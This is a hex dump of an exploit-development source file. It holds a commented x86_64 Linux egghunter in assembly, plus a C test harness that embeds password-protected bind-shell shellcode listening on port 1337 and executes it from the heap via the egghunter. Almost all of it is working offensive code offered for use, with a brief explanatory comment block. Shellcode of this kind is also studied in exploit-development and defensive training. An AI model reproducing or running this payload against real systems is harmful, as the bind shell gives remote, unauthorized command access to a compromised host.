00000000  3b 20 41 75 74 68 6f 72  20 44 6f 72 65 74 68 2e  |; Author Doreth.|
00000010  5a 31 30 0a 3b 0a 3b 20  4c 69 6e 75 78 20 78 38  |Z10.;.; Linux x8|
00000020  36 5f 36 34 20 45 67 67  68 75 6e 74 65 72 20 75  |6_64 Egghunter u|
00000030  73 69 6e 67 20 73 79 73  5f 61 63 63 65 73 73 28  |sing sys_access(|
00000040  29 0a 3b 20 53 68 65 6c  6c 63 6f 64 65 20 73 69  |).; Shellcode si|
00000050  7a 65 20 34 39 20 62 79  74 65 73 0a 3b 0a 0a 67  |ze 49 bytes.;..g|
00000060  6c 6f 62 61 6c 20 5f 73  74 61 72 74 0a 0a 73 65  |lobal _start..se|
00000070  63 74 69 6f 6e 20 2e 74  65 78 74 0a 0a 5f 73 74  |ction .text.._st|
00000080  61 72 74 3a 0a 0a 20 20  20 20 78 6f 72 20 72 73  |art:..    xor rs|
00000090  69 2c 20 72 73 69 20 20  20 20 20 20 20 20 3b 20  |i, rsi        ; |
000000a0  53 6f 6d 65 20 70 72 65  70 20 6a 75 6e 6b 2e 0a  |Some prep junk..|
000000b0  20 20 20 20 70 75 73 68  20 72 73 69 0a 20 20 20  |    push rsi.   |
000000c0  20 70 6f 70 20 72 64 78  0a 20 20 20 20 70 75 73  | pop rdx.    pus|
000000d0  68 20 38 0a 20 20 20 20  70 6f 70 20 72 62 78 0a  |h 8.    pop rbx.|
000000e0  0a 67 6f 5f 65 6e 64 5f  6f 66 5f 70 61 67 65 3a  |.go_end_of_page:|
000000f0  0a 20 20 20 20 6f 72 20  64 78 2c 20 30 78 66 66  |.    or dx, 0xff|
00000100  66 20 20 20 20 20 20 20  20 3b 20 57 65 20 61 6c  |f        ; We al|
00000110  69 67 6e 20 77 69 74 68  20 61 20 70 61 67 65 20  |ign with a page |
00000120  73 69 7a 65 20 6f 66 20  30 78 31 30 30 30 0a 20  |size of 0x1000. |
00000130  20 20 20 20 20 20 20 0a  6e 65 78 74 5f 62 79 74  |       .next_byt|
00000140  65 3a 0a 0a 20 20 20 20  69 6e 63 20 72 64 78 20  |e:..    inc rdx |
00000150  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 6e 65  |            ; ne|
00000160  78 74 20 62 79 74 65 20  6f 66 66 73 65 74 0a 20  |xt byte offset. |
00000170  20 20 20 70 75 73 68 20  32 31 20 20 20 20 20 20  |   push 21      |
00000180  20 20 20 0a 20 20 20 20  70 6f 70 20 72 61 78 20  |   .    pop rax |
00000190  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 57 65  |            ; We|
000001a0  20 6c 6f 61 64 20 61 63  63 65 73 73 28 29 20 69  | load access() i|
000001b0  6e 20 52 41 58 0a 20 20  20 20 70 75 73 68 20 72  |n RAX.    push r|
000001c0  64 78 0a 20 20 20 20 70  6f 70 20 72 64 69 0a 20  |dx.    pop rdi. |
000001d0  20 20 20 61 64 64 20 72  64 69 2c 20 72 62 78 20  |   add rdi, rbx |
000001e0  20 20 20 20 20 20 20 3b  20 57 65 20 6e 65 65 64  |       ; We need|
000001f0  20 74 6f 20 62 65 20 73  75 72 65 20 6f 75 72 20  | to be sure our |
00000200  38 20 62 79 74 65 20 65  67 67 20 63 68 65 63 6b  |8 byte egg check|
00000210  20 64 6f 65 73 20 6e 6f  74 20 73 70 61 6e 20 61  | does not span a|
00000220  63 72 6f 73 73 20 32 20  70 61 67 65 73 0a 20 20  |cross 2 pages.  |
00000230  20 20 73 79 73 63 61 6c  6c 20 20 20 20 20 20 20  |  syscall       |
00000240  20 20 20 20 20 20 3b 20  73 79 73 63 61 6c 6c 20  |      ; syscall |
00000250  74 6f 20 61 63 63 65 73  73 28 29 0a 0a 20 20 20  |to access()..   |
00000260  20 63 6d 70 20 61 6c 2c  20 30 78 66 32 20 20 20  | cmp al, 0xf2   |
00000270  20 20 20 20 20 3b 20 43  68 65 63 6b 73 20 66 6f  |     ; Checks fo|
00000280  72 20 45 46 41 55 4c 54  2e 20 20 45 46 41 55 4c  |r EFAULT.  EFAUL|
00000290  54 20 69 6e 64 69 63 61  74 65 73 20 62 61 64 20  |T indicates bad |
000002a0  70 61 67 65 20 61 63 63  65 73 73 2e 0a 20 0a 20  |page access.. . |
000002b0  20 20 20 6a 7a 20 67 6f  5f 65 6e 64 5f 6f 66 5f  |   jz go_end_of_|
000002c0  70 61 67 65 20 20 20 3b  20 69 66 20 45 46 41 55  |page   ; if EFAU|
000002d0  4c 54 2c 20 74 72 79 20  6e 65 78 74 20 70 61 67  |LT, try next pag|
000002e0  65 0a 0a 20 20 20 20 3b  20 2d 2d 0a 20 20 20 20  |e..    ; --.    |
000002f0  3b 20 50 75 74 20 79 6f  75 72 20 77 6f 6e 20 65  |; Put your won e|
00000300  67 67 20 68 65 72 65 20  21 0a 0a 20 20 20 20 6d  |gg here !..    m|
00000310  6f 76 20 65 61 78 2c 20  30 78 42 45 42 44 42 45  |ov eax, 0xBEBDBE|
00000320  42 44 20 3b 20 45 67 67  20 63 6f 6e 74 72 75 63  |BD ; Egg contruc|
00000330  74 69 6f 6e 20 73 6f 20  77 65 20 64 6f 6e 74 20  |tion so we dont |
00000340  63 61 74 63 68 20 6f 75  72 73 65 6c 66 20 21 0a  |catch ourself !.|
00000350  20 20 20 20 6e 6f 74 20  65 61 78 20 20 20 20 20  |    not eax     |
00000360  20 20 20 20 20 20 20 20  3b 20 49 6d 70 6f 72 74  |        ; Import|
00000370  61 6e 74 2c 20 45 47 47  20 6d 75 73 74 20 63 6f  |ant, EGG must co|
00000380  6e 74 61 69 6e 20 4e 4f  50 20 6c 69 6b 65 20 69  |ntain NOP like i|
00000390  6e 73 74 72 75 63 74 69  6f 6e 20 62 79 74 65 63  |nstruction bytec|
000003a0  6f 64 65 2e 0a 20 20 20  20 0a 20 20 20 20 3b 20  |ode..    .    ; |
000003b0  2d 2d 0a 20 20 20 20 6d  6f 76 20 72 64 69 2c 20  |--.    mov rdi, |
000003c0  72 64 78 0a 20 20 20 20  73 63 61 73 64 0a 20 20  |rdx.    scasd.  |
000003d0  20 20 6a 6e 7a 20 6e 65  78 74 5f 62 79 74 65 20  |  jnz next_byte |
000003e0  20 20 20 20 20 20 3b 20  69 66 20 65 67 67 20 64  |      ; if egg d|
000003f0  6f 65 73 20 6e 6f 74 20  6d 61 74 63 68 2c 20 74  |oes not match, t|
00000400  72 79 20 6e 65 78 74 20  62 79 74 65 0a 20 20 20  |ry next byte.   |
00000410  20 63 6d 70 20 65 61 78  2c 20 5b 72 64 69 5d 0a  | cmp eax, [rdi].|
00000420  20 20 20 20 6a 6e 7a 20  6e 65 78 74 5f 62 79 74  |    jnz next_byt|
00000430  65 20 20 20 20 20 20 20  3b 20 69 66 20 65 67 67  |e       ; if egg|
00000440  20 64 6f 65 73 20 6e 6f  74 20 6d 61 74 63 68 2c  | does not match,|
00000450  20 74 72 79 20 6e 65 78  74 20 62 79 74 65 0a 0a  | try next byte..|
00000460  20 20 20 20 6a 6d 70 20  72 64 69 20 20 20 20 20  |    jmp rdi     |
00000470  20 20 20 20 20 20 20 20  3b 20 47 6f 6f 64 2c 20  |        ; Good, |
00000480  66 6f 75 6e 64 20 65 67  67 2e 20 4a 75 6d 70 20  |found egg. Jump |
00000490  21 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |!.              |
000004a0  20 20 20 20 20 20 20 20  20 20 3b 20 49 6d 70 6f  |          ; Impo|
000004b0  72 74 61 6e 74 2c 20 45  47 47 20 6d 75 73 74 20  |rtant, EGG must |
000004c0  63 6f 6e 74 61 69 6e 20  4e 4f 50 20 6c 69 6b 65  |contain NOP like|
000004d0  20 69 6e 73 74 72 75 63  74 69 6f 6e 20 62 79 74  | instruction byt|
000004e0  65 63 6f 64 65 2e 0a 0a  0a 0a 3b 0a 3b 20 45 67  |ecode.....;.; Eg|
000004f0  67 68 75 6e 74 65 72 20  64 65 6d 6f 6e 73 74 72  |ghunter demonstr|
00000500  61 74 69 6f 6e 0a 3b 0a  3b 20 62 69 6e 64 73 68  |ation.;.; bindsh|
00000510  65 6c 6c 20 69 73 20 70  75 73 68 65 64 20 69 6e  |ell is pushed in|
00000520  20 74 68 65 20 68 65 61  70 20 75 73 69 6e 67 20  | the heap using |
00000530  61 20 6d 61 6c 6c 6f 63  28 29 20 63 61 6c 6c 20  |a malloc() call |
00000540  61 6e 64 20 70 72 65 2d  70 65 6e 64 65 64 20 77  |and pre-pended w|
00000550  69 74 68 20 74 68 65 20  65 67 67 2e 20 54 68 65  |ith the egg. The|
00000560  6e 20 65 67 67 68 75 6e  74 65 72 20 69 73 20 66  |n egghunter is f|
00000570  69 72 65 64 2e 0a 3b 0a  3b 20 44 65 70 65 6e 64  |ired..;.; Depend|
00000580  69 6e 67 20 6f 6e 20 73  69 7a 65 20 6f 66 20 74  |ing on size of t|
00000590  68 65 20 6d 61 6c 6c 6f  63 28 29 20 63 61 6c 6c  |he malloc() call|
000005a0  2c 20 62 69 6e 73 68 65  6c 6c 20 63 61 6e 20 62  |, binshell can b|
000005b0  65 20 61 6e 79 77 68 65  72 65 20 69 6e 20 74 68  |e anywhere in th|
000005c0  65 20 61 64 64 72 65 73  73 20 73 70 61 63 65 2e  |e address space.|
000005d0  0a 3b 20 46 6f 72 20 61  20 62 69 67 20 6d 61 6c  |.; For a big mal|
000005e0  6c 6f 63 28 29 20 73 69  7a 65 20 6c 69 6b 65 20  |loc() size like |
000005f0  31 20 30 30 30 20 30 30  30 20 62 79 74 65 73 2c  |1 000 000 bytes,|
00000600  20 69 74 20 77 69 6c 6c  20 62 65 20 70 6c 61 63  | it will be plac|
00000610  65 64 20 66 61 72 20 69  6e 20 74 68 65 20 61 64  |ed far in the ad|
00000620  64 72 65 73 73 20 73 70  61 63 65 2e 0a 3b 20 41  |dress space..; A|
00000630  20 6d 61 6c 6c 6f 63 28  31 30 30 30 30 30 30 29  | malloc(1000000)|
00000640  20 77 61 73 20 74 65 73  74 65 64 20 6f 6e 20 61  | was tested on a|
00000650  20 55 6e 62 75 6e 74 75  20 73 79 73 74 65 6d 20  | Unbuntu system |
00000660  77 69 74 68 20 49 6e 74  65 72 20 43 6f 72 65 20  |with Inter Core |
00000670  69 37 20 61 6e 64 20 69  74 20 74 6f 6f 6b 20 6f  |i7 and it took o|
00000680  76 65 72 20 39 20 68 72  73 20 66 6f 72 20 74 68  |ver 9 hrs for th|
00000690  65 20 65 67 67 68 75 6e  74 65 72 0a 3b 20 74 6f  |e egghunter.; to|
000006a0  20 66 69 6e 64 20 74 68  65 20 65 67 67 2e 20 0a  | find the egg. .|
000006b0  3b 0a 3b 20 45 6e 6a 6f  79 2e 0a 0a 0a 0a 23 69  |;.; Enjoy.....#i|
000006c0  6e 63 6c 75 64 65 20 3c  73 74 64 69 6f 2e 68 3e  |nclude <stdio.h>|
000006d0  0a 23 69 6e 63 6c 75 64  65 20 3c 73 74 64 6c 69  |.#include <stdli|
000006e0  62 2e 68 3e 0a 23 69 6e  63 6c 75 64 65 20 3c 73  |b.h>.#include <s|
000006f0  74 72 69 6e 67 2e 68 3e  0a 0a 75 6e 73 69 67 6e  |tring.h>..unsign|
00000700  65 64 20 63 68 61 72 20  65 67 67 5b 5d 20 3d 20  |ed char egg[] = |
00000710  0a 22 59 4f 55 52 20 45  47 47 20 48 45 52 45 20  |."YOUR EGG HERE |
00000720  34 20 62 79 74 65 73 22  3b 0a 0a 2f 2f 20 49 6e  |4 bytes";..// In|
00000730  20 74 68 69 73 20 65 78  61 6d 70 6c 65 20 77 65  | this example we|
00000740  20 75 73 65 20 61 20 70  61 73 73 77 6f 72 64 20  | use a password |
00000750  70 72 6f 74 65 63 74 65  64 20 62 69 6e 73 68 65  |protected binshe|
00000760  6c 6c 20 6f 6e 20 70 6f  72 74 20 31 33 33 37 3a  |ll on port 1337:|
00000770  20 70 41 7a 7a 57 30 72  64 20 0a 75 6e 73 69 67  | pAzzW0rd .unsig|
00000780  6e 65 64 20 63 68 61 72  20 62 69 6e 64 73 68 65  |ned char bindshe|
00000790  6c 6c 5b 5d 20 3d 20 0a  22 5c 78 65 62 5c 78 30  |ll[] = ."\xeb\x0|
000007a0  39 5c 78 34 38 5c 78 33  31 5c 78 66 66 5c 78 34  |9\x48\x31\xff\x4|
000007b0  38 5c 78 66 37 5c 78 65  37 5c 78 35 37 5c 78 35  |8\xf7\xe7\x57\x5|
000007c0  65 5c 78 63 33 5c 78 35  35 5c 78 34 38 5c 78 38  |e\xc3\x55\x48\x8|
000007d0  39 5c 78 65 35 5c 78 65  38 5c 78 65 65 5c 78 66  |9\xe5\xe8\xee\xf|
000007e0  66 5c 78 66 66 5c 78 66  66 5c 78 30 34 5c 78 32  |f\xff\xff\x04\x2|
000007f0  39 5c 78 34 30 5c 78 38  30 5c 78 63 37 5c 78 30  |9\x40\x80\xc7\x0|
00000800  32 5c 78 66 66 5c 78 63  36 5c 78 30 66 5c 78 30  |2\xff\xc6\x0f\x0|
00000810  35 5c 78 35 30 5c 78 65  38 5c 78 64 65 5c 78 66  |5\x50\xe8\xde\xf|
00000820  66 5c 78 66 66 5c 78 66  66 5c 78 30 34 5c 78 33  |f\xff\xff\x04\x3|
00000830  31 5c 78 34 38 5c 78 38  62 5c 78 33 63 5c 78 32  |1\x48\x8b\x3c\x2|
00000840  34 5c 78 35 36 5c 78 38  31 5c 78 63 36 5c 78 30  |4\x56\x81\xc6\x0|
00000850  33 5c 78 30 31 5c 78 30  35 5c 78 33 39 5c 78 36  |3\x01\x05\x39\x6|
00000860  36 5c 78 38 31 5c 78 65  65 5c 78 30 31 5c 78 30  |6\x81\xee\x01\x0|
00000870  31 5c 78 35 36 5c 78 34  38 5c 78 38 39 5c 78 65  |1\x56\x48\x89\xe|
00000880  36 5c 78 38 30 5c 78 63  32 5c 78 31 30 5c 78 30  |6\x80\xc2\x10\x0|
00000890  66 5c 78 30 35 5c 78 65  38 5c 78 62 65 5c 78 66  |f\x05\xe8\xbe\xf|
000008a0  66 5c 78 66 66 5c 78 66  66 5c 78 30 34 5c 78 33  |f\xff\xff\x04\x3|
000008b0  32 5c 78 34 38 5c 78 38  62 5c 78 37 64 5c 78 66  |2\x48\x8b\x7d\xf|
000008c0  38 5c 78 30 66 5c 78 30  35 5c 78 65 38 5c 78 62  |8\x0f\x05\xe8\xb|
000008d0  31 5c 78 66 66 5c 78 66  66 5c 78 66 66 5c 78 30  |1\xff\xff\xff\x0|
000008e0  34 5c 78 32 62 5c 78 34  38 5c 78 38 62 5c 78 37  |4\x2b\x48\x8b\x7|
000008f0  64 5c 78 66 38 5c 78 34  38 5c 78 38 39 5c 78 65  |d\xf8\x48\x89\xe|
00000900  36 5c 78 38 30 5c 78 63  32 5c 78 31 38 5c 78 35  |6\x80\xc2\x18\x5|
00000910  32 5c 78 34 38 5c 78 38  39 5c 78 65 32 5c 78 30  |2\x48\x89\xe2\x0|
00000920  66 5c 78 30 35 5c 78 34  39 5c 78 38 39 5c 78 63  |f\x05\x49\x89\xc|
00000930  30 5c 78 65 38 5c 78 39  37 5c 78 66 66 5c 78 66  |0\xe8\x97\xff\xf|
00000940  66 5c 78 66 66 5c 78 34  63 5c 78 38 39 5c 78 63  |f\xff\x4c\x89\xc|
00000950  37 5c 78 34 30 5c 78 38  30 5c 78 65 63 5c 78 31  |7\x40\x80\xec\x1|
00000960  38 5c 78 34 38 5c 78 38  39 5c 78 65 36 5c 78 38  |8\x48\x89\xe6\x8|
00000970  30 5c 78 63 32 5c 78 31  38 5c 78 30 66 5c 78 30  |0\xc2\x18\x0f\x0|
00000980  35 5c 78 34 38 5c 78 62  38 5c 78 37 30 5c 78 34  |5\x48\xb8\x70\x4|
00000990  31 5c 78 37 61 5c 78 37  61 5c 78 35 37 5c 78 33  |1\x7a\x7a\x57\x3|
000009a0  30 5c 78 37 32 5c 78 36  34 5c 78 34 38 5c 78 38  |0\x72\x64\x48\x8|
000009b0  39 5c 78 65 37 5c 78 34  38 5c 78 61 66 5c 78 37  |9\xe7\x48\xaf\x7|
000009c0  35 5c 78 34 32 5c 78 34  38 5c 78 33 31 5c 78 63  |5\x42\x48\x31\xc|
000009d0  30 5c 78 34 63 5c 78 38  39 5c 78 63 37 5c 78 34  |0\x4c\x89\xc7\x4|
000009e0  38 5c 78 33 31 5c 78 66  36 5c 78 34 30 5c 78 38  |8\x31\xf6\x40\x8|
000009f0  30 5c 78 63 36 5c 78 30  32 5c 78 30 34 5c 78 32  |0\xc6\x02\x04\x2|
00000a00  31 5c 78 30 66 5c 78 30  35 5c 78 34 38 5c 78 33  |1\x0f\x05\x48\x3|
00000a10  31 5c 78 63 30 5c 78 30  34 5c 78 32 31 5c 78 34  |1\xc0\x04\x21\x4|
00000a20  38 5c 78 66 66 5c 78 63  65 5c 78 37 35 5c 78 66  |8\xff\xce\x75\xf|
00000a30  34 5c 78 30 66 5c 78 30  35 5c 78 65 38 5c 78 35  |4\x0f\x05\xe8\x5|
00000a40  35 5c 78 66 66 5c 78 66  66 5c 78 66 66 5c 78 35  |5\xff\xff\xff\x5|
00000a50  30 5c 78 30 34 5c 78 33  62 5c 78 34 39 5c 78 62  |0\x04\x3b\x49\xb|
00000a60  38 5c 78 32 66 5c 78 32  66 5c 78 36 32 5c 78 36  |8\x2f\x2f\x62\x6|
00000a70  39 5c 78 36 65 5c 78 32  66 5c 78 37 33 5c 78 36  |9\x6e\x2f\x73\x6|
00000a80  38 5c 78 34 31 5c 78 35  30 5c 78 34 38 5c 78 38  |8\x41\x50\x48\x8|
00000a90  39 5c 78 65 37 5c 78 35  32 5c 78 34 38 5c 78 38  |9\xe7\x52\x48\x8|
00000aa0  39 5c 78 65 32 5c 78 35  37 5c 78 34 38 5c 78 38  |9\xe2\x57\x48\x8|
00000ab0  39 5c 78 65 36 5c 78 34  38 5c 78 38 39 5c 78 65  |9\xe6\x48\x89\xe|
00000ac0  63 5c 78 35 64 5c 78 30  66 5c 78 30 35 5c 78 34  |c\x5d\x0f\x05\x4|
00000ad0  38 5c 78 33 31 5c 78 63  30 5c 78 30 34 5c 78 33  |8\x31\xc0\x04\x3|
00000ae0  63 5c 78 30 66 5c 78 30  35 22 3b 0a 0a 75 6e 73  |c\x0f\x05";..uns|
00000af0  69 67 6e 65 64 20 63 68  61 72 20 65 67 67 68 75  |igned char egghu|
00000b00  6e 74 65 72 5b 5d 20 3d  20 0a 22 5c 78 34 38 5c  |nter[] = ."\x48\|
00000b10  78 33 31 5c 78 66 36 5c  78 35 36 5c 78 35 61 5c  |x31\xf6\x56\x5a\|
00000b20  78 36 61 5c 78 30 38 5c  78 35 62 5c 78 36 36 5c  |x6a\x08\x5b\x66\|
00000b30  78 38 31 5c 78 63 61 5c  78 66 66 5c 78 30 66 5c  |x81\xca\xff\x0f\|
00000b40  78 34 38 5c 78 66 66 5c  78 63 32 5c 78 36 61 5c  |x48\xff\xc2\x6a\|
00000b50  78 31 35 5c 78 35 38 5c  78 35 32 5c 78 35 66 5c  |x15\x58\x52\x5f\|
00000b60  78 34 38 5c 78 30 31 5c  78 64 66 5c 78 30 66 5c  |x48\x01\xdf\x0f\|
00000b70  78 30 35 5c 78 33 63 5c  78 66 32 5c 78 37 34 5c  |x05\x3c\xf2\x74\|
00000b80  78 65 61 5c 78 62 38 5c  78 62 64 5c 78 62 65 5c  |xea\xb8\xbd\xbe\|
00000b90  78 62 64 5c 78 62 65 5c  78 66 37 5c 78 64 30 5c  |xbd\xbe\xf7\xd0\|
00000ba0  78 34 38 5c 78 38 39 5c  78 64 37 5c 78 61 66 5c  |x48\x89\xd7\xaf\|
00000bb0  78 37 35 5c 78 65 32 5c  78 33 62 5c 78 30 37 5c  |x75\xe2\x3b\x07\|
00000bc0  78 37 35 5c 78 64 65 5c  78 66 66 5c 78 65 37 22  |x75\xde\xff\xe7"|
00000bd0  3b 0a 0a 0a 0a 6d 61 69  6e 28 29 0a 7b 0a 0a 20  |;....main().{.. |
00000be0  20 20 20 63 68 61 72 20  2a 68 65 61 70 20 3d 20  |   char *heap = |
00000bf0  28 63 68 61 72 2a 29 6d  61 6c 6c 6f 63 28 31 30  |(char*)malloc(10|
00000c00  30 30 30 30 30 29 3b 0a  20 20 20 20 6d 65 6d 73  |00000);.    mems|
00000c10  65 74 28 68 65 61 70 2c  20 27 5c 30 27 2c 20 35  |et(heap, '\0', 5|
00000c20  31 32 29 3b 0a 20 20 20  20 73 74 72 6e 63 70 79  |12);.    strncpy|
00000c30  28 68 65 61 70 2c 20 65  67 67 2c 20 34 29 3b 0a  |(heap, egg, 4);.|
00000c40  20 20 20 20 73 74 72 6e  63 70 79 28 68 65 61 70  |    strncpy(heap|
00000c50  2b 34 2c 20 65 67 67 2c  20 34 29 3b 0a 20 20 20  |+4, egg, 4);.   |
00000c60  20 73 74 72 6e 63 70 79  28 68 65 61 70 2b 38 2c  | strncpy(heap+8,|
00000c70  20 62 69 6e 64 73 68 65  6c 6c 2c 20 32 31 32 29  | bindshell, 212)|
00000c80  3b 0a 0a 20 20 20 20 70  72 69 6e 74 66 28 22 45  |;..    printf("E|
00000c90  67 67 68 75 6e 74 65 72  20 4c 65 6e 67 74 68 3a  |gghunter Length:|
00000ca0  20 25 64 5c 6e 22 2c 20  73 74 72 6c 65 6e 28 65  | %d\n", strlen(e|
00000cb0  67 67 68 75 6e 74 65 72  29 29 3b 0a 20 20 20 20  |gghunter));.    |
00000cc0  70 72 69 6e 74 66 28 22  53 68 65 6c 6c 63 6f 64  |printf("Shellcod|
00000cd0  65 20 4c 65 6e 67 74 68  3a 20 25 64 5c 6e 22 2c  |e Length: %d\n",|
00000ce0  20 73 74 72 6c 65 6e 28  62 69 6e 64 73 68 65 6c  | strlen(bindshel|
00000cf0  6c 29 29 3b 0a 20 20 20  20 20 20 20 20 69 6e 74  |l));.        int|
00000d00  20 28 2a 72 65 74 29 28  29 20 3d 20 28 69 6e 74  | (*ret)() = (int|
00000d10  28 2a 29 28 29 29 65 67  67 68 75 6e 74 65 72 3b  |(*)())egghunter;|
00000d20  0a 20 20 20 20 20 20 20  20 72 65 74 28 29 3b 0a  |.        ret();.|
00000d30  20 20 20 20 72 65 74 75  72 6e 20 30 3b 0a 7d     |    return 0;.}|
00000d3f
